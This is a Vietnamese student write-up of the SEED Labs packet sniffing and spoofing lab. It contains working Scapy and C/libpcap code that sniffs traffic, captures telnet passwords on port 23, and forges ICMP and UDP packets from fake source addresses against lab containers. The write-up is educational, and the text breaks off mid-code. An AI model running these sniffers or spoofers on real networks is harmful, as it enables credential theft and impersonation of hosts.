Packet Sniffing and Spoofing
===

Link: https://seedsecuritylabs.org/Labs_20.04/Networking/Sniffing_Spoofing/

---
## Mục lục <a name="menu"></a>

* [Mục lục](#menu)
* [Intro](#intro)
* [Task 1: Using Scapy to Sniff and Spoof Packets](#t1)
    * [Task 1.1: Sniffing Packets](#t1.1)
    * [Task 1.2: Spoofing ICMP Packets](#t1.2)
    * [Task 1.3: Traceroute](#t1.3)
    * [Task 1.4: Sniffing and-then Spoofing](#t1.4)
* [Task 2: Writing Programs to Sniff and Spoof Packets](#t2)
    * [Task 2.1: Writing Packet Sniffing Program](#t2.1)
    * [Task 2.2: Spoofing](#t2.2)
    * [Task 2.3: Sniff and then Spoof](#t2.3)

---
## Intro <a name="intro"></a>

Sniffing và Spoofing là 2 kỹ thuật thu thập thông tin được sử dụng phổ biến trong hacking, các công cụ sniffing và spoofing phổ biến như: Wireshark, Tcpdump, Scapy,... Bài lab này sẽ giới thiệu cho chúng ta về 2 kỹ thuật này, cách thức tấn công, thông tin thu thập, thư viện sử dụng,... sẽ được đề cập hết trong bài lab. Mục đích sau khi hoàn thành lab là chúng ta có thể nắm rõ cách thức hoạt động của sniffing và spoofing và có thể tự code được các công cụ có chức năng tương tự.

---
## Setup lab <a name="setup"></a>

Thực hiện cài docker, docker-compose plugin, docker desktop (nếu là người dùng trên pc) version mới nhất.

Tải thư mục đính kèm của lab về, chúng ta được 1 file compose .yml và thư mục volumes được sử dụng để share file giữa host với container (Đọc trong file task pdf sẽ rõ)

Đọc docs của docker để chuẩn bị các câu lệnh: https://docs.docker.com/engine/reference/run/

Xem qua đường dẫn đính kèm để setup: 
https://github.com/seed-labs/seed-labs/blob/master/manuals/docker/compose-onelan.md

---
## Task 1: Using Scapy to Sniff and Spoof Packets <a name="t1"></a>

*Task đầu tiên, chúng ta sẽ chạy thử đoạn script python ở attacker container, sử dụng thư viện Scapy để sniff gói tin từ host container và quan sat kết quả. Sau đó, chúng ta sẽ thử chỉnh sửa các filter để lọc kết quả*

Đầu tiên, chúng ta sẽ chạy docker-compose để build các container lab, sau đó bật chúng lên:

![](https://i.imgur.com/He135VN.png)

Kiểm tra bằng lệnh 'docker ps':

![](https://i.imgur.com/5xwLLw2.png)

Tiếp theo, chúng ta tương tác với các container, sử dụng exec để mở shell:

```docker exec -it <4 first digits of container id> <command>```

Seed-attacker:
![](https://i.imgur.com/ZCyZpBW.png)

HostB-10.9.0.6:
![](https://i.imgur.com/shChEaF.png)

Tiếp theo, chúng ta sẽ tiến hành task1.1

> *Lưu ý: đến đoạn này, sau khi mở 2 container, các bạn có thể thử viết đoạn code python sử dụng Scapy (có thể sử dụng đoạn code trong pdf) để show thông tin IP config. Các bạn có thể code và chỉnh sửa code trên thư mục volumes trong folder local, vì đó là shared thư mục, nên khi code bỏ vào đó thì bên attacker container sẽ nhận được, đỡ phải code trên container rất bất tiện. Vì phần này đã được hướng dẫn nên mình sẽ bỏ qua, đi tiếp tới task 1.1.*

---
### Task 1.1: Sniffing Packets <a name="t1.1"></a>

Đầu tiên, chúng ta sẽ chuẩn bị đoạn code sau trong folder volums:
```python
#!/usr/bin/env python3
from scapy.all import *
def print_pkt(pkt):
    pkt.show()
pkt = sniff(iface=’br-<your_network_interface>’, filter=’icmp’, prn=print_pkt)
```

Cấp quyền thực thi cho nó và chạy:

![](https://i.imgur.com/nLnHGJj.png)

Tiến tới máy hostB, cho nó ping tới 8.8.8.8 (google.com) và quan sát kết quả bên attacker:

![](https://i.imgur.com/9oTferB.png)

![](https://i.imgur.com/a113jgc.png)

Chúng ta thành công thu được các gói tin icmp do máy hostB gửi tới google.com, sniffing cơ bản thành công.

**A.** Tiếp theo, chúng ta sẽ đổi user và thực thi file sniff.py:

![](https://i.imgur.com/mA7hrvv.png)

Chúng ta có thể thấy là file sniff chỉ thực thi được dưới quyền user root, với user seed thì permission denied, trong output ls -la chúng ta có thể thấy rõ. Lí do là vì scapy sniff() cần bật chế độ promiscuous mode của wireless interface - cho phép mọi traffic đi qua mà không lọc chúng, do đó nó cần có quyền root. Chúng ta có thể set capilities để có thể thực thì file dưới quyền user thường. Nguồn tham khảo: 

> https://stackoverflow.com/questions/36215201/python-scapy-sniff-without-root

**B.** Khi sniff gói tin trong mạng, vì lượng traffic đổ vào rất nhiều và sẽ có nhiều gói tin rác không cần thiết, do đó chúng ta cần sử dụng filter để lọc nó lại, để lọc chúng, ta sẽ thay đổi tham số filer trong đoạn code vừa mới sử dụng:

* Chỉ bắt các gói tin ICMP: ```filter='icmp'```
* Bắt tất cả gói TCP với địa chỉ cụ thể và có port đích là 23: 
> ```filter='tcp and dst port 23'``` 
* Bắt tất cả gói tin có nguồn và đích là subnet chỉ định: Giả sử chọn subnet là: 10.0.2.0/24, lúc này filter của chúng ta là:
> ```filter='src net 10.0.2.0/24 or dst net 10.0.2.0/24'```

**Test filter 1**: thực hiện tương tự phần sniff trên

**Test filter 2**: Sử dụng telnet kết nối tới 1 máy server, xem phần bắt gói bên attacker:

![](https://i.imgur.com/CmKE7Ek.png)

![](https://i.imgur.com/qQc1tID.png)

**Test filter 3**: dùng máy host ping tới 1 địa chỉ trong mạng 10.0.2.0/24 (10.0.2.15), sau đó để máy attacker sniffing và xem kết quả src, dst của các gói tin

![](https://i.imgur.com/LwLftyi.png)

src = 10.0.2.15
![](https://i.imgur.com/VPHpIxu.png)

dst = 10.0.2.15
![](https://i.imgur.com/kaehK9x.png)

---
### Task 1.2: Spoofing ICMP Packets <a name="t1.2"></a>

Ở task này, chúng ta sẽ tiến hành spoofing gói tin ICMP echo request, chúng ta sẽ tạo ra gói tin và gửi nó cho 1 máy trong cùng mạng rồi đợi máy đó phản hồi lại, chúng ta sẽ dùng wireshark để bắt các traffic. Đoạn code spoof.py như sau:

``` python
#!/usr/bin/env python3
from scapy.all import *

a = IP()
a.dst = '10.9.0.5'
a.src = '10.1.1.1'
b = ICMP()
p = a/b

p.show()
send(p)
```

10.9.0.5 là IP của máy host seed, 10.1.1.1 là IP mình chế ra để thử spoofing với IP bất kì, chúng ta sẽ chạy spoof.py rồi dùng wireshark bắt gói tin phản hồi tại interface br-...:

![](https://i.imgur.com/oUHFc9V.png)

![](https://i.imgur.com/WbMAAJv.png)

Thành công spoofing gói ICMP máy 10.9.0.5

---
### Task 1.3: Traceroute <a name="t1.3"></a>

Mục đích của task này là sử dụng scapy để spoofing và traceroute được 1 địa chỉ IP chỉ định, bằng việc set TTL bằng 1 thì khi gói tin được gửi đi tới router đầu tiên thì router sẽ trả về ICMP error message là packet expired, nhờ đó, chúng ta biết được IP của router gửi gói error, sau đó, cứ tăng dần TTL lên cho tới khi nào lấy được tất cả IP của các router trên đường đến đích. Chúng ta sẽ sử dụng đoạn code python sau:

```python=
#!/usr/bin/env python3
from scapy.all import *

a = IP()
a.dst = '8.8.8.8'
i = 1

while 1:
	a.ttl = i
	b = ICMP()
	p = a/b
	resp = sr1(p)
	if resp is None:
		print('Can not reach destination host')
		break
	elif resp.type == 0:
		print('Traceroute done!! TTL: ' + str(i) + ' - IP: ' + str(resp.src)) 
		break
	else:
		print('TTL: ' + str(i) + ' - IP: ' + str(resp.src)) 
		
	i = i + 1
```

Đoạn code trên sẽ thực hiện traceroute tới 8.8.8.8 (google.com) sử dụng vòng lặp để tăng TTL lên, đồng thời dùng sr1() để gửi gói tin và nhận phản hồi, các điều kiện if là để xét trường hợp gói tin bị mất hoặc tới đích hoặc đang đi, sau đó là in ra. Kết quả output như sau:

![](https://i.imgur.com/UZMGTRV.png)

![](https://i.imgur.com/PDFjgvr.png)

> Như vậy, ta đã thành công trace được đường đi tới 8.8.8.8 (google.com) với scapy module

---
### Task 1.4: Sniffing and-then Spoofing <a name="t1.4"></a>

Nhiệm vụ của chúng ta ở task này đó là tạo 1 chương trình vừa có thể sniffing vừa có thể spoofing, theo đó, chúng ta sẽ sử dụng 2 máy: 1 là attacker và 1 là user. User sẽ gửi các gói tin icmp (ping) tới 1 địa chỉ ip, attacker sẽ sniff các gói tin đó, rồi tiến hành spoofing, mạo danh địa chỉ ip kia để gửicác gói tin về lại cho user container.

Vì đây chỉ là task demo nên chúng ta không cần modify quá nhiều hay thêm các payload vào. Chương trình sniff_and_spoof như sau:

```python=
#!/usr/bin/env python3
from scapy.all import *

print("Start sniffing packet....\n")

def sniff_and_spoof(pkt):
	if (pkt[ICMP].type == 8):
        print("Packet information:")
		print("Source: " + str(pkt[IP].src))
		print("Destination: " + str(pkt[IP].dst))
        
		new_ip = IP()
		new_ip.src = pkt[IP].dst
		new_ip.dst = pkt[IP].src
		
		new_icmp = ICMP()
		load = pkt[ICMP].load
		new_icmp.id = pkt[ICMP].id
		new_icmp.seq = pkt[ICMP].seq
		new_icmp.type = 0
		
		print("Spoofing packet...")
		
		reply = new_ip/new_icmp/load
		send(reply)
		print("\n")
	 
pkt = sniff(iface='br-91a1f05a03f3', filter='icmp', prn=sniff_and_spoof)
```

Ở đoạn code trên, chúng ta sẽ tiến hành sniff gói bằng hàm sniff() của Scapy, sau đó lọc các gói tin echo request (ICMP type 8) và tiến hành sao chép chúng sang 1 gói tin mới là reply. Sau đó, chúng ta sẽ thay đổi src thành dst và dst thành src để giả làm 1.2.3.4 gửi gói tin về cho user container, đó là mục đích chính của spoofing.

Để test thử chương trình, chúng ta cho user container chạy lệnh ping tới 3 địa chỉ được gợi ý trong bài, attacker thì sẽ chạy file code để monitoring packet, sử dụng wireshark để mô tả chi tiết:

![](https://i.imgur.com/KYuZ5oz.png)

* ping 1.2.3.4 - Địa chỉ internet không tồn tại

![](https://i.imgur.com/wG65bU8.png)

![](https://i.imgur.com/moZHhNo.png)

![](https://i.imgur.com/DgYW69j.png)

Có thể thấy dù địa chỉ 1.2.3.4 không tồn tại nhưng vẫn có gói tin trả về cho chương trình ping của user container, đây chính là những packet attacker sniff được và gửi lại cho user

* ping 10.9.0.99 - Địa chỉ cùng mạng nhưng không tồn tại

![](https://i.imgur.com/mdTmNVr.png)

![](https://i.imgur.com/tkTRLCk.png)

![](https://i.imgur.com/g4Vy4oe.png)

Có thể thấy, lần này ping tới 1 địa chỉ không tồn tại khác nhưng cùng mạng với user container thì chương trình sniff không bắt gói và gửi ngược về như trường hợp 1 được, đó là vì khi gửi gói tin trong cùng mạng sẽ sử dụng giao thức ARP để tra cứu MAC address của IP đích. ARP sẽ broadcasting gói tin thăm dò trong toàn mạng để tìm MAC address của thiết bị có IP đích chỉ định, nếu có thì sẽ gửi gói tin tới, nếu không thì xuất ra thông báo như hình. Quan sát wireshark để có cái nhìn chi tiết hơn.

* ping 8.8.8.8 - Địa chỉ có thật trên mạng

![](https://i.imgur.com/f5oCDG8.png)

![](https://i.imgur.com/XQI9AN6.png)

![](https://i.imgur.com/x0vs13c.png)

Có thể thấy kết quả có những dòng bị DUP như sau:

![](https://i.imgur.com/JJV096i.png)

Điều này có nghĩa là user container vừa nhận được gói echo reply của 8.8.8.8 vừa nhận được gói echo của máy attacker nên sẽ bị duplicate, do đó, chúng ta có thể sửa gói tin reply của attacker để không bị duplicate nữa, nhờ đó, user sẽ không nhận ra là đang bị spoofing

> Sau 3 trường hợp thử, chúng ta đã thành công giả mạo mạng có thật và không thật trên internet, đối với spoofing cũng mạng thì do giao thức ARP nên chúng ta vẫn chưa giả mạo được host không tồn tại trong cùng mạng

---
## Task 2: Writing Programs to Sniff and Spoof Packets <a name="t2"></a>

Đối với task 2 này, chúng ta sẽ không code python nữa mà chuyển sang dùng C để tạo các program sniff and spoof, thư viện hỗ trợ sẽ là ```pcap```

Link manual: https://www.tcpdump.org/manpages/pcap.3pcap.html

Để cài đặt libpcap trên linux, chúng ta cần chạy lệnh sau:

```shell=
sudo apt install libpcap-dev
```

Sau đó bật vscode và include vào như bình thường

Đối với windows thì có thể dùng Windows Subsystem for Linux (WSL) và tiến hành cài với câu lệnh trên

Chúng ta cần xây dựng chương trình sniff, spoof nên sẽ dùng các header như IP, ICMP, Ethernet,... Do đó, cần tạo các struct như sau:

```cpp=
/* Ethernet header */
struct ethheader {
    u_char  ether_dhost[6];  
    u_char  ether_shost[6];    
    u_short ether_type;               
};

/* IP Header */
struct ipheader {
  unsigned char      iph_ihl:4, 
                     iph_ver:4;
  unsigned char      iph_tos; 
  unsigned short int iph_len; 
  unsigned short int iph_ident; 
  unsigned short int iph_flag:3,
                     iph_offset:13;
  unsigned char      iph_ttl; 
  unsigned char      iph_protocol;
  unsigned short int iph_chksum; 
  struct  in_addr    iph_sourceip; 
  struct  in_addr    iph_destip;   
};

/* ICMP Header  */
struct icmpheader {
  unsigned char icmp_type; 
  unsigned char icmp_code; 
  unsigned short int icmp_chksum; 
  unsigned short int icmp_id;     
  unsigned short int icmp_seq;    
};

/* UDP Header */
struct udpheader
{
  u_int16_t udp_sport;         
  u_int16_t udp_dport;           
  u_int16_t udp_ulen;           
  u_int16_t udp_sum;           
};

/* TCP Header */
struct tcpheader {
    u_short tcp_sport;              
    u_short tcp_dport;   
    u_int   tcp_seq;     
    u_int   tcp_ack;
    u_char  tcp_offx2;               
#define TH_OFF(th)      (((th)->tcp_offx2 & 0xf0) >> 4)
    u_char  tcp_flags;
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#define TH_ECE  0x40
#define TH_CWR  0x80
#define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
    u_short tcp_win;                
    u_short tcp_sum;               
    u_short tcp_urp;                 
};

```

---
### Task 2.1: Writing Packet Sniffing Program <a name="t2.1"></a>

Task này sẽ yêu cầu chúng ta viết chương trình bằng C để sniff packet trên interface wireless như ở task đầu, đầu tiên, chúng ta sẽ test đoạn code sau được chạy trên máy attacker để sniff traffic từ interface br-...:

```cpp=
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    printf("Got a packet\n");
}

int main()
{
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char filter_exp[] = "icmp";
    bpf_u_int32 net;

    handle = pcap_open_live("br-91a1f05a03f3", BUFSIZ, 1, 1000, errbuf);

    pcap_compile(handle, &fp, filter_exp, 0, net);

    if (pcap_setfilter(handle, &fp) !=0) {
        pcap_perror(handle, "Error:");
        exit(EXIT_FAILURE);
    }

    pcap_loop(handle, -1, got_packet, NULL);
    pcap_close(handle); 
    return 0;
}
```
Compile và chạy nó trên máy attacker:

![](https://i.imgur.com/MpN6tVa.png)


Ping tới địa chỉ bất kì trên user container, ta có thể thấy kết quả là attacker sniff được packet bên user gửi đi và nhận về:

![](https://i.imgur.com/5PObSba.png)

![](https://i.imgur.com/Qhn86pJ.png)

**2.1A. Understand how sniffers works:** nhiệm vụ tiếp theo của chúng ta là code ra 1 cái program mới để in ra thông tin của packet rồi sau đó sẽ sniffing packet. Để thực hiện được điều này, chúng ta sẽ định nghĩa thêm 2 struct, 1 là cho ethernet header, 1 là ip header:

```cpp=
#include <pcap.h>
#include <stdlib.h>
#include <stdio.h>
#include <arpa/inet.h>

struct ethheader {...};

struct ipheader {...};

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    struct ethheader *eth = (struct ethheader *)packet;

    if (ntohs(eth->ether_type) == 0x0800) {
    
    struct ipheader * ip = (struct ipheader *)
                           (packet + sizeof(struct ethheader)); 

    printf("       From: %s\n", inet_ntoa(ip->iph_sourceip));   
    printf("         To: %s\n", inet_ntoa(ip->iph_destip));    
    switch(ip->iph_protocol) {                                 
        case IPPROTO_TCP:
            printf("   Protocol: TCP\n");
            return;
        case IPPROTO_UDP:
            printf("   Protocol: UDP\n");
            return;
        case IPPROTO_ICMP:
            printf("   Protocol: ICMP\n");
            return;
        default:
            printf("   Protocol: others\n");
            return;
    }
  }
}

int main()
{
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char filter_exp[] = "icmp";
    bpf_u_int32 net;

    handle = pcap_open_live("br-91a1f05a03f3", BUFSIZ, 1, 1000, errbuf);

    pcap_compile(handle, &fp, filter_exp, 0, net);

    if (pcap_setfilter(handle, &fp) !=0) {
        pcap_perror(handle, "Error:");
        exit(EXIT_FAILURE);
    }

    pcap_loop(handle, -1, got_packet, NULL);
    pcap_close(handle); 
    return 0;
}
```

Test thử chương trình trên:

User container ping tới 8.8.8.8:
![](https://i.imgur.com/mx0JjDr.png)

Chạy chương trình trên attacker:
![](https://i.imgur.com/SNltvp0.png)

Kết quả thu được chi tiết hơn về gói tin

* **Question 1:** 

> Với đoạn chương trình trên, đầu tiên, chúng ta sẽ dùng 2 header cho các thuộc tính ethernet và ip trên packet:

![](https://i.imgur.com/fRgGWhK.png)

> Chúng ta sẽ trỏ tới thuộc tính của header ethernet trong packet bằng cách tạo con trỏ ethernet và di chuyển nó tới đầu địa chỉ header ethernet của packet và typecast:

![](https://i.imgur.com/3KgBrGu.png)

> Vòng lặp xét xem packet thuộc IPv4 hay không (chương trình này chỉ xét IPv4), sau đó sẽ tiến đến khai thác IP src và IP dest và loại protocol của packet:

![](https://i.imgur.com/pIAKoeG.png)

> Hàm main sẽ tạo filter, tạo các biến và gọi hàm got_packet mỗi khi nhận được packet từ interface chỉ định:

![](https://i.imgur.com/xIYUso5.png)

* **Question 2:**

> Sở dĩ chúng ta không thể chạy chương trình này ở user thông thường là vì để có thể sniff các packet, program cần bật chế độ promiscuous của NIC lên để nhận mọi traffic lưu thông trong mạng. Chế độ này cần quyền tương tác với kernel để thay đổi vì NIC hoạt động ở kernel mode, do đó chúng ta cần root privilege, trường hợp không quyền root sẽ như sau:

![](https://i.imgur.com/TabTS9y.png)

* **Question 3:**

> Sự khác biệt của promiscuous mode với chế độ thường là promiscuous mode sẽ nhận hết mọi gói tin lưu thông trên mạng dù thuộc hay không thuộc về host. Các gói tin đến từ host hay gửi cho host hay đi qua host đề được thu thập lại, tạ bản sao và gửi lên kernel. Đối với chế độ thường thì sẽ bỏ hết các gói tin không thuộc về host. Chúng ta sẽ thử tắt promiscuous mode trên program bằng cách sửa tham số thứ 3 (từ 0 -> 1) trong hàm pcap_open_live() và tiến hành chạy thử:

![](https://i.imgur.com/AKBWM5e.png)

![](https://i.imgur.com/Ofqsm04.png)

![](https://i.imgur.com/I9j9WGQ.png)

> Kết quả là chương trình vẫn thu thập được gói tin vì máy attacker cùng mạng với máy user, do đó gói tin có thể đi qua host attacker để đến default gateway và truyền ra bên ngoài, do có đi qua nên gói tin bị sniff lại.

**2.1B. Viết filters cho program**

* Filter 1: Chỉ bắt các gói tin ICMP giữa 2 host chỉ định:

Chúng ta sẽ sử dụng filter sau:

![](https://i.imgur.com/7nvljoA.png)

Filter hoàn chỉnh sẽ như sau: 

```"icmp and host 10.9.0.6 and host 8.8.8.8"```

![](https://i.imgur.com/fcpo4eT.png)

Test filter, 10.9.0.6 là máy user container chạy lệnh ping, 8.8.8.8 là địa chỉ host mà user ping tới:

![](https://i.imgur.com/TjKMcXv.png)

![](https://i.imgur.com/QlftGJQ.png)

* Filter 2: Chỉ bắt gói tin TCP và có dst port trong khoảng 10 đến 100:

Chúng ta sẽ sử dụng filter sau:

![](https://i.imgur.com/8cwa10f.png)

Filter hoàn chỉnh sẽ như sau:

``` tcp and dst portrange 10-100 ```

![](https://i.imgur.com/d3gpTzW.png)

Test filter, chúng ta sử dụng nc giữa 2 máy host ở port 99:

![](https://i.imgur.com/VdgRujZ.png)

![](https://i.imgur.com/pJX8QdQ.png)

**2.1C. Sniffing password:**

Chúng ta sẽ dùng filter sau:

``` tcp port 23 ```

Cơ chế sniff password telnet sẽ là bắt các gói tin trao đổi giữa telnet server và telnet client, trong data của gói sẽ có password, lí do là vì telnet là 1 giao thức không an toàn:

```cpp=
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <ctype.h>


#define ETHER_ADDR_LEN 6
#define SIZE_ETHERNET 14

struct ethheader {...};

struct ipheader {...};
#define IP_HL(ip)               (((ip)->iph_ihl) & 0x0f)

typedef unsigned int tcp_seq;

struct sniff_tcp {
  unsigned short th_sport; 
  unsigned short th_dport;
  tcp_seq th_seq;      
  tcp_seq th_ack;     
  unsigned char th_offx2; 
    #define TH_OFF(th)  (((th)->th_offx2 & 0xf0) >> 4)
  unsigned char th_flags;
  #define TH_FIN 0x01
  #define TH_SYN 0x02
  #define TH_RST 0x04
  #define TH_PUSH 0x08
  #define TH_ACK 0x10
  #define TH_URG 0x20
  #define TH_ECE 0x40
  #define TH_CWR 0x80
  #define TH_FLAGS (TH_FIN | TH_SYN | TH_RST | TH_ACK | TH_URG | TH_ECE | TH_CWR)
  unsigned short th_win; 
  unsigned short th_sum; 
  unsigned short th_urp; 
};

void print_payload(const u_char * payload, int len) {
    const u_char * ch;
    ch = payload;
    printf("Payload: \n\t\t");

    for(int i=0; i < len; i++){
        if(isprint(*ch)){
        	if(len == 1) {
        		printf("\t%c", *ch);
        	}
        	else {
        		printf("%c", *ch);
        	}
        }
        ch++;
    }
    printf("\n=====\n");
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    const struct sniff_tcp *tcp;
    const char *payload;
    int size_ip;
    int size_tcp;
    int size_payload;

    struct ethheader *eth = (struct ethheader *)packet;

  if (ntohs(eth->ether_type) == 0x0800) {
    struct ipheader * ip = (struct ipheader *)(packet + sizeof(struct ethheader)); 
    size_ip = IP_HL(ip)*4;

    switch(ip->iph_protocol) {                               
        case IPPROTO_TCP:
            tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
            size_tcp = TH_OFF(tcp)*4;

            payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
            size_payload = ntohs(ip->iph_len) - (size_ip + size_tcp);
            
            if(size_payload > 0){
	            printf("Source: %s Port: %d\n", inet_ntoa(ip->iph_sourceip), ntohs(tcp->th_sport));
	            printf("Destination: %s Port: %d\n", inet_ntoa(ip->iph_destip), ntohs(tcp->th_dport));
	            printf("   Protocol: TCP\n");
                print_payload(payload, size_payload);
            }
            return;      
        default:
            printf("   Protocol: others\n");
            return;
    }
  }
}

int main() {
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char filter_exp[] = "tcp port 23";
    bpf_u_int32 net;

    handle = pcap_open_live("br-91a1f05a03f3", BUFSIZ, 1, 1000, errbuf);

    pcap_compile(handle, &fp, filter_exp, 0, net);
    pcap_setfilter(handle, &fp);

    pcap_loop(handle, -1, got_packet, NULL);

    pcap_close(handle);
    return 0;
}
```

*Lưu ý: chúng ta cần thêm struct thuộc tính của TCP header để khai thác trường data trong gói packet để lấy password*

---
### Task 2.2: Spoofing <a name="t2.2"></a>

Task này chúng ta sẽ tiến hành viết chương trình c để spoofing gói tin trên interface mạng, các bước spoofing bằng c cũng tương tự với bằng python, chúng ta sẽ tạo raw packet, set các option (thuộc tính) cho nó rồi sau đó gửi đi tới địa chỉ chỉ định

**2.2A. Chương trình spoofing cơ bản**

Chúng ta sẽ dựa theo trình tự trên để tạo ra chương trình spoofing cơ bản: tạo raw packet -> set thuộc tính -> gửi đi. Đoạn code chương trình spoof cơ bản như sau:

```cpp=
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

struct ipheader {...};

struct udpheader{...};

void send_raw_ip_packet(struct ipheader* ip) {
	struct sockaddr_in dest_info;
	int enable = 1;
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

	dest_info.sin_family = AF_INET;
	dest_info.sin_addr = ip->iph_destip;

	sendto(sock, ip, ntohs(ip->iph_len),0, (struct sockaddr *)&dest_info, sizeof(dest_info));
	close(sock);
}

int main() {
   char buffer[1500];

   memset(buffer, 0, 1500);
   struct ipheader *ip = (struct ipheader *) buffer;
   struct udpheader *udp = (struct udpheader *) (buffer +
                                          sizeof(struct ipheader));
    
   char *data = buffer + sizeof(struct ipheader) +
                         sizeof(struct udpheader);
   const char *msg = "This is a spoofing attack!\n";
   int data_len = strlen(msg);
   strncpy (data, msg, data_len);

   udp->udp_sport = htons(12345);
   udp->udp_dport = htons(9090);
   udp->udp_ulen = htons(sizeof(struct udpheader) + data_len);
   udp->udp_sum =  0;
   ip->iph_ver = 4;
   ip->iph_ihl = 5;
   ip->iph_ttl = 20;
   ip->iph_sourceip.s_addr = inet_addr("1.2.3.4");
   ip->iph_destip.s_addr = inet_addr("10.9.0.6");
   ip->iph_protocol = IPPROTO_UDP;
   ip->iph_len = htons(sizeof(struct ipheader) +
                       sizeof(struct udpheader) + data_len);

   while(1){
        printf("Spoofing...\n");
        send_raw_ip_packet (ip); 
        printf("Sent 1 packet!\n");
   }

   return 0;
}
```

Đầu tiên, chúng ta cần sử dụng 2 struct header là ip và udp (vì đây là spoof gói tin udp), do đã định nghĩa ở phần trên nên mình sẽ để {...} để rút gọn code. Chúng ta sẽ tạo và set các thuộc tính cho packet ở main():

![](https://i.imgur.com/qGINMAP.png)

Có thể thấy, IP nguồn sẽ là 1.2.3.4 là IP không tồn tại, đích đến sẽ là máy user container, nội dung của message được chúng ta định nghĩa ở ```char* msg``` Tiếp theo, chúng ta loop goi hàm send packet để send liên tiếp các packet tới user:

![](https://i.imgur.com/B7XnWf8.png)

![](https://i.imgur.com/xaAFaGr.png)


Dùng wireshark để bắt gói tin lại và xem kết quả:

![](https://i.imgur.com/zUrGQML.png)

![](https://i.imgur.com/ONisu8T.png)

![](https://i.imgur.com/hAS8Eb6.png)

**2.2B. Spoof ICMP echo request:**

Với task này, chúng ta cần tạo gói tin ICMP với type = 8 (echo request) rồi spoofing như bình thường. Để tạo gói ICMP và gán các thuộc tính mong muốn, chúng ta cần dùng 2 struct header là IP và ICMP. Đoạn code chương trình như sau:

```cpp=
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

struct ipheader {...};

struct icmpheader {...};

unsigned short in_cksum (unsigned short *buf, int length){
   unsigned short *w = buf;
   int nleft = length;
   int sum = 0;
   unsigned short temp=0;
    
   while (nleft > 1)  {
       sum += *w++;
       nleft -= 2;
   }

   if (nleft == 1) {
        *(u_char *)(&temp) = *(u_char *)w ;
        sum += temp;
   }

   sum = (sum >> 16) + (sum & 0xffff); 
   sum += (sum >> 16);                
   return (unsigned short)(~sum);
}

void send_raw_ip_packet(struct ipheader* ip){
    struct sockaddr_in dest_info;
	int enable = 1;
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

	dest_info.sin_family = AF_INET;
	dest_info.sin_addr = ip->iph_destip;

	sendto(sock, ip, ntohs(ip->iph_len),0, (struct sockaddr *)&dest_info, sizeof(dest_info));
	close(sock);
}

int main() {
   char buffer[1500];

   memset(buffer, 0, 1500);
    
   struct icmpheader *icmp = (struct icmpheader *)
                             (buffer + sizeof(struct ipheader));
   icmp->icmp_type = 8;

   icmp->icmp_chksum = 0;
   icmp->icmp_chksum = in_cksum((unsigned short *)icmp,
                                 sizeof(struct icmpheader));

   struct ipheader *ip = (struct ipheader *) buffer;
   ip->iph_ver = 4;
   ip->iph_ihl = 5;
   ip->iph_ttl = 20;
   ip->iph_sourceip.s_addr = inet_addr("1.2.3.4");
   ip->iph_destip.s_addr = inet_addr("10.9.0.6");
   ip->iph_protocol = IPPROTO_ICMP;
   ip->iph_len = htons(sizeof(struct ipheader) +
                       sizeof(struct icmpheader));

   while(1){
        printf("Spoofing ICMP echo request...\n");
        send_raw_ip_packet (ip); 
        printf("Sent 1 packet!\n");
   }

   return 0;
}
```

Chúng ta sẽ tạo packet ICMP và gán type = 8:

![](https://i.imgur.com/PH9tdiY.png)

Sau đó gán cho packet các thuộc tính của ip header để chỉ định src và dst:

![](https://i.imgur.com/n7GeaHZ.png)

Hàm tính checksum cho ICMP header:

![](https://i.imgur.com/9NHRkb3.png)

Cuối cùng là gửi gói tin liên tục:

![](https://i.imgur.com/fq7oHtg.png)

![](https://i.imgur.com/NEIQixa.png)

* **Question 1: Có thể set trường độ dài của IP header thành bất kì không?**

> Câu trả lời là có, trường độ dài có thể được set tùy ý nhưng khi gửi đi thì độ dài của packet sẽ là độ dài thật sự và sẽ không có padding thêm vào packet

* **Question 2: Chúng ta có cần tính checksum cho raw packet không?**

> Câu trả lời là không, default thì kernel sẽ làm việc đó cho ta khi khởi tạo raw packet nhưng tính năng này có thể bị tắt đi để tính checksum thủ công

* **Question 3: Tại sao cần quyền root để thực thi program vơi raw packet?**

> Bởi vì khi ở user privilege thì chúng ta không đủ quyền để thay đổi tất cả các thuộc tính trong packet, ngoài ra, root privilege còn có đủ quyền để tương tác với socket và tắt bật promiscuous mode trên NIC, trong khi user privilege không có.

---
### Task 2.3: Sniff and then Spoof <a name="t2.3"></a>

Ở task này, chúng ta sẽ phối hợp cả sniffing và spoofing vào trong 1 chương trình viết bằng C. Kết hợp 2 phần trên, chúng ta sẽ có đoạn code sau:

```cpp=
#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <fcntl.h> 
#include <unistd.h> 

struct ethheader {...};

struct ipheader {...};

struct icmpheader {...};

#define PACKET_LEN 512

void send_raw_ip_packet(struct ipheader* ip) {
    struct sockaddr_in dest_info;
    int enable = 1;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
